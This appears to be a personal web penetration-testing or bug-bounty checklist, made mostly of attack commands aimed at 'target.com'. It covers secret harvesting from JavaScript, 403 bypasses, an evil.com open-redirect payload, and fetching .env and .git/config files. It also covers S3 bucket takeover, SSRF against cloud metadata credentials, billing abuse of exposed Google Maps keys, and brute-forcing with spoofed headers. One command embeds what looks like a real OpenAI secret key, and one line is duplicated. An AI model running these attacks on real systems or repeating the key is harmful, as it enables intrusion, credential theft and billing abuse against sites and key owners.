✓ ✗ ✔ ✘ ✅
For Recon : 
[ ] - Use this command under a folder named as Target
	```assetfinder --subs-only target.com >> recon.txt  
	subfinder -d target.com -silent >> recon.txt  
	amass enum -passive -d target.com >> recon.txt  
	sort -u recon.txt > final-subs.txt
	cat final-subs.txt | httpx -status-code -title -tech-detect -silent > live-subs.txt```
[ ] - Check for `robots.txt` and `sitemap.xml` for subdomains and directories
[ ] - Checking for Secrets in JS FIles
	1. Download all the JS Files present.
	2. Use the command to grep the secrets, keys and tokens : 		```
		cat js_files.txt | while read url; do curl -s $url >> all_javascript_dump.txt; done  
		grep -iE "apikey|token|secret|authorization|bearer" all_javascript_dump.txt```
[ ] - Bruteforce checking all JS Files : `ffuf -w common.txt -u https://target.com/assets/js/FUZZ`
[ ] - Always check User Agent for for Logs, it may give RFi
[ ] - Checking for 403 Forbidden : 
	[ ] - **Adding headers** (like `X-Forwarded-For`, `X-Originating-IP`)
	[ ] - **Trying HTTP methods** (`GET`, `POST`, `HEAD`, `OPTIONS`)
	[ ] - **Using URL encoding tricks** (`%2e`, `%2f`, etc.)
	[ ] - **Appending a dot (**`**.**`**) or a slash (**`**/**`**) at the end**
	[ ] - **Spoofing the Referer header** (`Referer: example.com/allowed-page`)
[ ] - Check for the parameter named `redirect` that is used to redirect the site to the internal sites and then try to pollute it like : `https://app.target.com/login?redirect=dashboard&redirect=https://evil.com`
[ ] - Required payloads to be tried once : 
	```curl https://target.com/config/settings_dev.json
	curl https://target.com/.env
	curl https://target.com/.git/config```
[ ] - Check for the Technology used in the website. If it's Wordpress then : 
	[ ]  -Try using a wp-scan with the API Key to get a full report.
	[ ] - Check the notes in INE-WAPT -> CMS Security Testing
	[ ] - 
[ ] - Check for AWS Buckets : 
	[ ] - Check CNAME using the command : `dig old-staging.target.com CNAME` . If the result looks like this : `old-staging.target.com.  300 IN CNAME  old-target-dev.s3-website-us-east-1.amazonaws.com.` Then use the command : `aws s3 ls s3://old-target-dev` to check for the existence of the bucket.
	If this has happened this shows that, the origin S3 bucket was gone, but is still present as the CNAME of the target. Now we can own the bucket under our account using the command : `aws s3 mb s3://old-target-dev` . Create a simple HTML Page to host the website. Upload it using the command : ```aws s3 website s3://old-target-dev --index-document index.html
	aws s3 cp index.html s3://old-target-dev/ --acl public-read```
	Then to chain it with SSRF, we can use this command by making some changes into it  : `curl -X POST http://old-staging.target.com/api/render -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"}'`
	Then to chain it with SSRF, we can use this command by making some changes into it  : `curl -X POST http://old-staging.target.com/api/render -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"}'`
[ ] - API Keys
	[ ] - Google Maps API Key Exposure Impact - 
		[ ] - Check with this command if we get any response or not : `curl "https://maps.googleapis.com/maps/api/geocode/json?address=Delhi&key=<exposed-key>" `      
		[ ] -  Check for High Billing Impact : 
		```for i in {1..10}; do
		curl "https://maps.googleapis.com/maps/api/geocode/json?address=New+York+$i&key=<exposed-apikey>"
		done```
		[ ] - Check for Directions API : `curl "https://maps.googleapis.com/maps/api/directions/json?origin=Delhi&destination=Mumbai&key=<exposed-apikey>"`
		 [ ] - Check for DistanceMatrix API : `curl "https://maps.googleapis.com/maps/api/distancematrix/json?origins=Delhi&destinations=Bangalore&key=<exposed-apikey>"`
		 [ ] - Check for Places API : `curl "https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants+in+Goa&key=<exposed-apikey>"`
		 [ ] - Create an HTML Page and try to use the key and get the services running : Go check out the Google MAP API Key Exploitation Page
	[ ] - OpenAI API Key - 
		[ ] - Use this command to check for the authenticity : `curl -i -s -H "Authorization: Bearer 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" -H "Accept: application/json"  "https://api.openai.com/v1/chat/completions" -X GET`
		
`
[ ] - Authentication Attacks : 
1. Brute-forcing the username to get a valid username by checking precisely over the response packets.
2. If the Server blocks your IP, then try to use a Header in the Response Packet named as `X-Forarded-For:` and use a Pitchfork Attack and provide this with a random number set. Keep an eye on the response use the settings like : Grep-by Match, Response Timing Delays.
[ ] - Check for CORS
	1. by just adding this in the Request Packet : `Origin: https://example.com` and then check for the response if we observe the same URL in Response in `Access-Control-Allow-Origin` then we can exploit it by displaying that onto our website.
	2. Check by adding `null` if the above doesn't work out, and if the null works out then we can also generate Cross-origin requests.
	3. Exploiting XSS using CORS : 
		1. Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
		2. Given the following request:
		`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=...`
		3. If the server responds with:
		`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`
		4. Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like: `https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

[ ] - 